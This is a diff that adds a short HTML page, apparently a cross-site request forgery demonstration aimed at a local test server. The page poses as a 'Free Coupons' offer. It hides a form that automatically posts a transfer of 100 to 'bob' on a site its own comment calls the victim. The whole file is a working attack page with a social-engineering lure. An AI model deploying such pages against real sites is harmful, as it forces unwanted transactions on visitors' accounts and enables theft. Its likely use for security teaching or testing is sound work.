@@ -1,0 +1,9 @@
+<!doctype html>
+<title>Free Coupons</title>
+<h1>Click for free coupons!</h1>
+<!-- Auto-submitting form targets victim site -->
+<form method="POST" action="http://localhost:3001/transfer" id="f">
+  <input type="hidden" name="to" value="bob">
+  <input type="hidden" name="amount" value="100">
+</form>
+<script>document.getElementById('f').submit()</script>
